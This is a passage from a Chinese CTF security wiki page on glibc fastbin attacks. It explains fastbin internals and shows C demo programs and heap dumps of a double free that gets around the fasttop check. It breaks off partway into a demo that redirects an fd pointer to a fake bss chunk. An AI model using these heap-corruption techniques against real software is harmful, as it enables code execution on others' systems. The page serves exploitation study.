
<!doctype html>
<html lang="zh" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      
        <meta name="description" content="SkYe Wiki">
      
      
      
        <meta name="author" content="SkYe231">
      
      
        <link rel="canonical" href="https://wiki.mrskye.cn/Pwn/glibc-heap/fastbin/">
      
      <link rel="shortcut icon" href="../../../assets/images/favicon.png">
      <meta name="generator" content="mkdocs-1.1.2, mkdocs-material-6.2.4">
    
    
      
        <title>Fastbin Attack - SkYe Wiki</title>
      
    
    
      <link rel="stylesheet" href="../../../assets/stylesheets/main.15aa0b43.min.css">
      
        
        <link rel="stylesheet" href="../../../assets/stylesheets/palette.75751829.min.css">
        
          
          
          <meta name="theme-color" content="#ffffff">
        
      
    
    
    
      
        
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Noto+Sans:300,400,400i,700%7CSource+Code+Pro&display=fallback">
        <style>body,input{font-family:"Noto Sans",-apple-system,BlinkMacSystemFont,Helvetica,Arial,sans-serif}code,kbd,pre{font-family:"Source Code Pro",SFMono-Regular,Consolas,Menlo,monospace}</style>
      
    
    
    
    
      
        
<script>window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)},ga.l=+new Date,ga("create","UA-36723568-3","wiki.mrskye.cn"),ga("set","anonymizeIp",!0),ga("send","pageview"),document.addEventListener("DOMContentLoaded",function(){document.forms.search&&document.forms.search.query.addEventListener("blur",function(){if(this.value){var e=document.location.pathname;ga("send","pageview",e+"?q="+this.value)}})}),document.addEventListener("DOMContentSwitch",function(){ga("send","pageview",document.location.pathname)})</script>
<script async src="https://www.google-analytics.com/analytics.js"></script>
      
    
    
  </head>
  
  
    
    
    
    
    
    <body dir="ltr" data-md-color-scheme="" data-md-color-primary="white" data-md-color-accent="green">
      
  
    
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" for="__drawer"></label>
    <div data-md-component="skip">
      
        
        <a href="#fastbin-attack" class="md-skip">
          跳转至
        </a>
      
    </div>
    <div data-md-component="announce">
      
    </div>
    
      

<header class="md-header" data-md-component="header">
  <nav class="md-header-nav md-grid" aria-label="Header">
    <a href="https://wiki.mrskye.cn/" title="SkYe Wiki" class="md-header-nav__button md-logo" aria-label="SkYe Wiki">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M18 22a2 2 0 002-2V4a2 2 0 00-2-2h-6v7L9.5 7.5 7 9V2H6a2 2 0 00-2 2v16a2 2 0 002 2h12z"/></svg>

    </a>
    <label class="md-header-nav__button md-icon" for="__drawer">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2z"/></svg>
    </label>
    <div class="md-header-nav__title" data-md-component="header-title">
      <div class="md-header-nav__ellipsis">
        <div class="md-header-nav__topic">
          <span class="md-ellipsis">
            SkYe Wiki
          </span>
        </div>
        <div class="md-header-nav__topic">
          <span class="md-ellipsis">
            
              Fastbin Attack
            
          </span>
        </div>
      </div>
    </div>
    
      <label class="md-header-nav__button md-icon" for="__search">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0116 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 019.5 16 6.5 6.5 0 013 9.5 6.5 6.5 0 019.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
      </label>
      
<div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" aria-label="搜索" placeholder="搜索" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" data-md-state="active" required>
      <label class="md-search__icon md-icon" for="__search">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0116 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 019.5 16 6.5 6.5 0 013 9.5 6.5 6.5 0 019.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
      </label>
      <button type="reset" class="md-search__icon md-icon" aria-label="Clear" data-md-component="search-reset" tabindex="-1">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41z"/></svg>
      </button>
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" data-md-scrollfix>
        <div class="md-search-result" data-md-component="search-result">
          <div class="md-search-result__meta">
            正在初始化搜索引擎
          </div>
          <ol class="md-search-result__list"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
    
    
      <div class="md-header-nav__source">
        
<a href="https://github.com/skyedai910/wiki.mrskye.cn/" title="前往 GitHub 仓库" class="md-source">
  <div class="md-source__icon md-icon">
    
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path d="M439.55 236.05L244 40.45a28.87 28.87 0 00-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 01-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 000 40.81l195.61 195.6a28.86 28.86 0 0040.8 0l194.69-194.69a28.86 28.86 0 000-40.81z"/></svg>
  </div>
  <div class="md-source__repository">
    skyedai910/wiki.mrskye.cn
  </div>
</a>
      </div>
    
  </nav>
</header>
    
    <div class="md-container" data-md-component="container">
      
      
        
      
      <main class="md-main" data-md-component="main">
        <div class="md-main__inner md-grid">
          
            
              
              <div class="md-sidebar md-sidebar--primary" data-md-component="navigation" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    




<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
  <label class="md-nav__title" for="__drawer">
    <a href="https://wiki.mrskye.cn/" title="SkYe Wiki" class="md-nav__button md-logo" aria-label="SkYe Wiki">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M18 22a2 2 0 002-2V4a2 2 0 00-2-2h-6v7L9.5 7.5 7 9V2H6a2 2 0 00-2 2v16a2 2 0 002 2h12z"/></svg>

    </a>
    SkYe Wiki
  </label>
  
    <div class="md-nav__source">
      
<a href="https://github.com/skyedai910/wiki.mrskye.cn/" title="前往 GitHub 仓库" class="md-source">
  <div class="md-source__icon md-icon">
    
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path d="M439.55 236.05L244 40.45a28.87 28.87 0 00-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 01-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 000 40.81l195.61 195.6a28.86 28.86 0 0040.8 0l194.69-194.69a28.86 28.86 0 000-40.81z"/></svg>
  </div>
  <div class="md-source__repository">
    skyedai910/wiki.mrskye.cn
  </div>
</a>
    </div>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
      



  
  <li class="md-nav__item md-nav__item--nested">
    
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-1" type="checkbox" id="nav-1" >
    
    <label class="md-nav__link" for="nav-1">
      Pwn
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Pwn" data-md-level="1">
      <label class="md-nav__title" for="nav-1">
        <span class="md-nav__icon md-icon"></span>
        Pwn
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          



  
  <li class="md-nav__item md-nav__item--nested">
    
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-1-1" type="checkbox" id="nav-1-1" >
    
    <label class="md-nav__link" for="nav-1-1">
      格式化字符串
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="格式化字符串" data-md-level="2">
      <label class="md-nav__title" for="nav-1-1">
        <span class="md-nav__icon md-icon"></span>
        格式化字符串
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          



  <li class="md-nav__item">
    <a href="../../fmtstr/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80%E4%BE%8B%E5%AD%90/" class="md-nav__link">
      格式化字符串漏洞基础例子
    </a>
  </li>

        
          
          
          



  <li class="md-nav__item">
    <a href="../../fmtstr/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80%E5%88%A9%E7%94%A8/" class="md-nav__link">
      格式化字符串漏洞基础利用
    </a>
  </li>

        
          
          
          



  <li class="md-nav__item">
    <a href="../../fmtstr/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9B%B2%E6%89%93/Bilnd_Pwn/" class="md-nav__link">
      格式化字符串盲打
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              
              <div class="md-sidebar md-sidebar--secondary" data-md-component="toc" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    
<nav class="md-nav md-nav--secondary" aria-label="目录">
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      目录
    </label>
    <ul class="md-nav__list" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#_1" class="md-nav__link">
    介绍
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_2" class="md-nav__link">
    原理
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#fastbin-double-free" class="md-nav__link">
    Fastbin Double Free
  </a>
  
    <nav class="md-nav" aria-label="Fastbin Double Free">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_3" class="md-nav__link">
    介绍
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_4" class="md-nav__link">
    演示
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_5" class="md-nav__link">
    小总结
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#house-of-spirit" class="md-nav__link">
    House Of Spirit
  </a>
  
    <nav class="md-nav" aria-label="House Of Spirit">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_6" class="md-nav__link">
    介绍
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_7" class="md-nav__link">
    演示
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_8" class="md-nav__link">
    小总结
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#alloc-to-stack" class="md-nav__link">
    Alloc to Stack
  </a>
  
    <nav class="md-nav" aria-label="Alloc to Stack">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_9" class="md-nav__link">
    介绍
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_10" class="md-nav__link">
    演示
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_11" class="md-nav__link">
    小总结
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#arbitrary-alloc" class="md-nav__link">
    Arbitrary Alloc
  </a>
  
    <nav class="md-nav" aria-label="Arbitrary Alloc">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_12" class="md-nav__link">
    介绍
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_13" class="md-nav__link">
    演示
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_14" class="md-nav__link">
    小总结
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#2014-hacklu-oreo" class="md-nav__link">
    2014 hack.lu oreo
  </a>
  
    <nav class="md-nav" aria-label="2014 hack.lu oreo">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_15" class="md-nav__link">
    基本情况
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_16" class="md-nav__link">
    基本功能
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_17" class="md-nav__link">
    漏洞
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_18" class="md-nav__link">
    思路
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#exp" class="md-nav__link">
    EXP
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#2015-9447-ctf-search-engine" class="md-nav__link">
    2015 9447 CTF : Search Engine
  </a>
  
    <nav class="md-nav" aria-label="2015 9447 CTF : Search Engine">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_19" class="md-nav__link">
    基本情况
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_20" class="md-nav__link">
    基本功能
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_21" class="md-nav__link">
    漏洞
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_22" class="md-nav__link">
    思路
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#exp_1" class="md-nav__link">
    EXP
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#2017-0ctf-babyheap" class="md-nav__link">
    2017 0ctf babyheap
  </a>
  
    <nav class="md-nav" aria-label="2017 0ctf babyheap">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_23" class="md-nav__link">
    基本情况
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_24" class="md-nav__link">
    基本功能
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_25" class="md-nav__link">
    漏洞
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_26" class="md-nav__link">
    思路
  </a>
  
    <nav class="md-nav" aria-label="思路">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#unsortedbin-fastbin" class="md-nav__link">
    伪造 unsortedbin 为 fastbin
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#exp_2" class="md-nav__link">
    EXP
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          <div class="md-content">
            <article class="md-content__inner md-typeset">
              
                
                  <a href="https://github.com/skyedai910/wiki.mrskye.cn/blob/master/docs/Pwn/glibc-heap/fastbin.md" title="编辑此页" class="md-content__button md-icon">
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20.71 7.04c.39-.39.39-1.04 0-1.41l-2.34-2.34c-.37-.39-1.02-.39-1.41 0l-1.84 1.83 3.75 3.75M3 17.25V21h3.75L17.81 9.93l-3.75-3.75L3 17.25z"/></svg>
                  </a>
                
                
                <h1 id="fastbin-attack">Fastbin Attack<a class="headerlink" href="#fastbin-attack" title="Permanent link">&para;</a></h1>
<h2 id="_1">介绍<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
<p>fastbin attack 是一类漏洞的利用方法，是指所有基于 fastbin 机制的漏洞利用方法。这类利用的前提是：</p>
<ul>
<li>存在堆溢出、use-after-free 等能控制 chunk 内容的漏洞</li>
<li>漏洞发生于 fastbin 类型的 chunk 中</li>
</ul>
<p>如果细分的话，可以做如下的分类：</p>
<ul>
<li>Fastbin Double Free</li>
<li>House of Spirit</li>
<li>Alloc to Stack</li>
<li>Arbitrary Alloc</li>
</ul>
<p>其中，前两种主要漏洞侧重于利用 <code>free</code> 函数释放**真的 chunk 或伪造的 chunk**，然后再次申请 chunk 进行攻击，后两种侧重于故意修改 <code>fd</code> 指针，直接利用 <code>malloc</code> 申请指定位置 chunk 进行攻击。</p>
<h2 id="_2">原理<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
<p>fastbin attack 存在的原因在于 fastbin 是使用单链表来维护释放的堆块的，并且由 fastbin 管理的 chunk 即使被释放，其 next_chunk 的 prev_inuse 位也不会被清空。 我们来看一下 fastbin 是怎样管理空闲 chunk 的。</p>
<div class="highlight"><pre><span></span><code><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
<span class="p">{</span>
    <span class="kt">void</span> <span class="o">*</span><span class="n">chunk1</span><span class="p">,</span><span class="o">*</span><span class="n">chunk2</span><span class="p">,</span><span class="o">*</span><span class="n">chunk3</span><span class="p">;</span>
    <span class="n">chunk1</span><span class="o">=</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x30</span><span class="p">);</span>
    <span class="n">chunk2</span><span class="o">=</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x30</span><span class="p">);</span>
    <span class="n">chunk3</span><span class="o">=</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x30</span><span class="p">);</span>
    <span class="c1">//进行释放</span>
    <span class="n">free</span><span class="p">(</span><span class="n">chunk1</span><span class="p">);</span>
    <span class="n">free</span><span class="p">(</span><span class="n">chunk2</span><span class="p">);</span>
    <span class="n">free</span><span class="p">(</span><span class="n">chunk3</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div>
<p>释放前</p>
<div class="highlight"><pre><span></span><code>0x602000:   0x0000000000000000  0x0000000000000041 &lt;=== chunk1
0x602010:   0x0000000000000000  0x0000000000000000
0x602020:   0x0000000000000000  0x0000000000000000
0x602030:   0x0000000000000000  0x0000000000000000
0x602040:   0x0000000000000000  0x0000000000000041 &lt;=== chunk2
0x602050:   0x0000000000000000  0x0000000000000000
0x602060:   0x0000000000000000  0x0000000000000000
0x602070:   0x0000000000000000  0x0000000000000000
0x602080:   0x0000000000000000  0x0000000000000041 &lt;=== chunk3
0x602090:   0x0000000000000000  0x0000000000000000
0x6020a0:   0x0000000000000000  0x0000000000000000
0x6020b0:   0x0000000000000000  0x0000000000000000
0x6020c0:   0x0000000000000000  0x0000000000020f41 &lt;=== top chunk
</code></pre></div>
<p>执行三次 free 进行释放后</p>
<div class="highlight"><pre><span></span><code>0x602000:   0x0000000000000000  0x0000000000000041 &lt;=== chunk1
0x602010:   0x0000000000000000  0x0000000000000000
0x602020:   0x0000000000000000  0x0000000000000000
0x602030:   0x0000000000000000  0x0000000000000000
0x602040:   0x0000000000000000  0x0000000000000041 &lt;=== chunk2
0x602050:   0x0000000000602000  0x0000000000000000
0x602060:   0x0000000000000000  0x0000000000000000
0x602070:   0x0000000000000000  0x0000000000000000
0x602080:   0x0000000000000000  0x0000000000000041 &lt;=== chunk3
0x602090:   0x0000000000602040  0x0000000000000000
0x6020a0:   0x0000000000000000  0x0000000000000000
0x6020b0:   0x0000000000000000  0x0000000000000000
0x6020c0:   0x0000000000000000  0x0000000000020f41 &lt;=== top chunk
</code></pre></div>
<p>此时位于 main_arena 中的 fastbin 链表中已经储存了指向 chunk3 的指针，并且 chunk 3、2、1 构成了一个单链表</p>
<div class="highlight"><pre><span></span><code>Fastbins[idx=2, size=0x30,ptr=0x602080]
===&gt;Chunk(fd=0x602040, size=0x40, flags=PREV_INUSE)
===&gt;Chunk(fd=0x602000, size=0x40, flags=PREV_INUSE)
===&gt;Chunk(fd=0x000000, size=0x40, flags=PREV_INUSE)
</code></pre></div>
<h2 id="fastbin-double-free">Fastbin Double Free<a class="headerlink" href="#fastbin-double-free" title="Permanent link">&para;</a></h2>
<h3 id="_3">介绍<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h3>
<p>Fastbin Double Free 是指 fastbin 的 chunk 可以被多次释放，因此可以在 fastbin 链表中存在多次。这样导致的后果是多次分配可以从 fastbin 链表中取出同一个堆块，相当于多个指针指向同一个堆块，结合堆块的数据内容可以实现类似于类型混淆 (type confused) 的效果。</p>
<p>Fastbin Double Free 能够成功利用主要有两部分的原因</p>
<ol>
<li>fastbin 的堆块被释放后 next_chunk 的 pre_inuse 位不会被清空</li>
<li>fastbin 在执行 free 的时候仅验证了 main_arena 直接指向的块，即链表指针头部的块。对于链表后面的块，并没有进行验证。</li>
</ol>
<div class="highlight"><pre><span></span><code><span class="cm">/* Another simple check: make sure the top of the bin is not the</span>
<span class="cm">       record we are going to add (i.e., double free).  */</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">__builtin_expect</span> <span class="p">(</span><span class="n">old</span> <span class="o">==</span> <span class="n">p</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span>
      <span class="p">{</span>
        <span class="n">errstr</span> <span class="o">=</span> <span class="s">&quot;double free or corruption (fasttop)&quot;</span><span class="p">;</span>
        <span class="k">goto</span> <span class="n">errout</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div>
<h3 id="_4">演示<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h3>
<p>下面的示例程序说明了这一点，当我们试图执行以下代码时</p>
<div class="highlight"><pre><span></span><code><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
<span class="p">{</span>
    <span class="kt">void</span> <span class="o">*</span><span class="n">chunk1</span><span class="p">,</span><span class="o">*</span><span class="n">chunk2</span><span class="p">,</span><span class="o">*</span><span class="n">chunk3</span><span class="p">;</span>
    <span class="n">chunk1</span><span class="o">=</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x10</span><span class="p">);</span>
    <span class="n">chunk2</span><span class="o">=</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x10</span><span class="p">);</span>

    <span class="n">free</span><span class="p">(</span><span class="n">chunk1</span><span class="p">);</span>
    <span class="n">free</span><span class="p">(</span><span class="n">chunk1</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div>
<p>如果你执行这个程序，不出意外的话会得到如下的结果，这正是 _int_free 函数检测到了 fastbin 的 double free。</p>
<div class="highlight"><pre><span></span><code>*** Error in `./tst&#39;: double free or corruption (fasttop): 0x0000000002200010 ***
======= Backtrace: =========
/lib/x86_64-linux-gnu/libc.so.6(+0x777e5)[0x7fbb7a36c7e5]
/lib/x86_64-linux-gnu/libc.so.6(+0x8037a)[0x7fbb7a37537a]
/lib/x86_64-linux-gnu/libc.so.6(cfree+0x4c)[0x7fbb7a37953c]
./tst[0x4005a2]
/lib/x86_64-linux-gnu/libc.so.6(__libc_start_main+0xf0)[0x7fbb7a315830]
./tst[0x400499]
======= Memory map: ========
00400000-00401000 r-xp 00000000 08:01 1052570                            /home/Ox9A82/tst/tst
00600000-00601000 r--p 00000000 08:01 1052570                            /home/Ox9A82/tst/tst
00601000-00602000 rw-p 00001000 08:01 1052570                            /home/Ox9A82/tst/tst
02200000-02221000 rw-p 00000000 00:00 0                                  [heap]
7fbb74000000-7fbb74021000 rw-p 00000000 00:00 0
7fbb74021000-7fbb78000000 ---p 00000000 00:00 0
7fbb7a0df000-7fbb7a0f5000 r-xp 00000000 08:01 398790                     /lib/x86_64-linux-gnu/libgcc_s.so.1
7fbb7a0f5000-7fbb7a2f4000 ---p 00016000 08:01 398790                     /lib/x86_64-linux-gnu/libgcc_s.so.1
7fbb7a2f4000-7fbb7a2f5000 rw-p 00015000 08:01 398790                     /lib/x86_64-linux-gnu/libgcc_s.so.1
7fbb7a2f5000-7fbb7a4b5000 r-xp 00000000 08:01 415688                     /lib/x86_64-linux-gnu/libc-2.23.so
7fbb7a4b5000-7fbb7a6b5000 ---p 001c0000 08:01 415688                     /lib/x86_64-linux-gnu/libc-2.23.so
7fbb7a6b5000-7fbb7a6b9000 r--p 001c0000 08:01 415688                     /lib/x86_64-linux-gnu/libc-2.23.so
7fbb7a6b9000-7fbb7a6bb000 rw-p 001c4000 08:01 415688                     /lib/x86_64-linux-gnu/libc-2.23.so
7fbb7a6bb000-7fbb7a6bf000 rw-p 00000000 00:00 0
7fbb7a6bf000-7fbb7a6e5000 r-xp 00000000 08:01 407367                     /lib/x86_64-linux-gnu/ld-2.23.so
7fbb7a8c7000-7fbb7a8ca000 rw-p 00000000 00:00 0
7fbb7a8e1000-7fbb7a8e4000 rw-p 00000000 00:00 0
7fbb7a8e4000-7fbb7a8e5000 r--p 00025000 08:01 407367                     /lib/x86_64-linux-gnu/ld-2.23.so
7fbb7a8e5000-7fbb7a8e6000 rw-p 00026000 08:01 407367                     /lib/x86_64-linux-gnu/ld-2.23.so
7fbb7a8e6000-7fbb7a8e7000 rw-p 00000000 00:00 0
7ffcd2f93000-7ffcd2fb4000 rw-p 00000000 00:00 0                          [stack]
7ffcd2fc8000-7ffcd2fca000 r--p 00000000 00:00 0                          [vvar]
7ffcd2fca000-7ffcd2fcc000 r-xp 00000000 00:00 0                          [vdso]
ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]
已放弃 (核心已转储)
</code></pre></div>
<p>如果我们在 chunk1 释放后，再释放 chunk2 ，这样 main_arena 就指向 chunk2 而不是 chunk1 了，此时我们再去释放 chunk1 就不再会被检测到。</p>
<div class="highlight"><pre><span></span><code><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
<span class="p">{</span>
    <span class="kt">void</span> <span class="o">*</span><span class="n">chunk1</span><span class="p">,</span><span class="o">*</span><span class="n">chunk2</span><span class="p">,</span><span class="o">*</span><span class="n">chunk3</span><span class="p">;</span>
    <span class="n">chunk1</span><span class="o">=</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x10</span><span class="p">);</span>
    <span class="n">chunk2</span><span class="o">=</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x10</span><span class="p">);</span>

    <span class="n">free</span><span class="p">(</span><span class="n">chunk1</span><span class="p">);</span>
    <span class="n">free</span><span class="p">(</span><span class="n">chunk2</span><span class="p">);</span>
    <span class="n">free</span><span class="p">(</span><span class="n">chunk1</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div>
<p>第一次释放<code>free(chunk1)</code></p>
<p><img alt="fastbin_free_chunk1" src="img\fastbin_free_chunk1.png" /></p>
<p>第二次释放<code>free(chunk2)</code></p>
<p><img alt="fastbin_free_chunk2" src="img\fastbin_free_chunk2.png" /></p>
<p>第三次释放<code>free(chunk1)</code></p>
<p><img alt="fastbin_free_chunk3" src="img\fastbin_free_chunk3.png" /></p>
<p>注意因为 chunk1 被再次释放因此其 fd 值不再为 0 而是指向 chunk2，这时如果我们可以控制 chunk1 的内容，便可以写入其 fd 指针从而实现在我们想要的任意地址分配 fastbin 块。 下面这个示例演示了这一点，首先跟前面一样构造 main_arena=&gt;chunk1=&gt;chun2=&gt;chunk1 的链表。之后第一次调用 malloc 返回 chunk1 之后修改 chunk1 的 fd 指针指向 bss 段上的 bss_chunk，之后我们可以看到 fastbin 会把堆块分配到这里。</p>
<div class="highlight"><pre><span></span><code><span class="k">typedef</span> <span class="k">struct</span> <span class="nc">_chunk</span>
<span class="p">{</span>
    <span class="kt">long</span> <span class="kt">long</span> <span class="n">pre_size</span><span class="p">;</span>
    <span class="kt">long</span> <span class="kt">long</span> <span class="n">size</span><span class="p">;</span>
    <span class="kt">long</span> <span class="kt">long</span> <span class="n">fd</span><span class="p">;</span>
    <span class="kt">long</span> <span class="kt">long</span> <span class="n">bk</span><span class="p">;</span>
<span class="p">}</span> <span class="n">CHUNK</span><span class="p">,</span><span class="o">*</span><span class="n">PCHUNK</span><span class="p">;</span>

<span class="n">CHUNK</span> <span class="n">bss_chunk</span><span class="p">;</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
<span class="p">{</span>
    <span class="kt">void</span> <span class="o">*</span><span class="n">chunk1</span><span class="p">,</span><span class="o">*</span><span class="n">chunk2</span><span class="p">,</span><span class="o">*</span><span class="n">chunk3</span><span class="p">;</span>
    <span class="kt">void</span> <span class="o">*</span><span class="n">chunk_a</span><span class="p">,</span><span class="o">*</span><span class="n">chunk_b</span><span class="p">;</span>

    <span class="n">bss_chunk</span><span class="p">.</span><span class="n">size</span><span class="o">=</span><span class="mh">0x21</span><span class="p">;</span>
    <span class="n">chunk1</span><span class="o">=</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x10</span><span class="p">);</span>
